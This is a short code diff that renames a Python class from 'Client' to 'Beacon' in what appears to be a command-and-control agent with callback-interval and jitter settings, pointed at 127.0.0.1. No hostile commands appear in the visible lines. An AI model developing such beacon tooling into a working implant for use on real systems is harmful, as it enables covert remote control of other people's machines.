@@ -5,7 +5,7 @@ import subprocess
 import platform
 import random
 
-class Client:
+class Beacon:
 
     def __init__(self,server_ip, port=80,callback_interval=120,jitter=5,debug=False,https=False):
         self.server_ip = server_ip
@@ -98,8 +98,8 @@ class Client:
                     print(e)
 
 def main():
-    client = Client("127.0.0.1",callback_interval=15,jitter=7)
-    client.run()
+    beacon = Beacon("127.0.0.1",callback_interval=15,jitter=7)
+    beacon.run()
 
 if __name__ == '__main__':
     main()
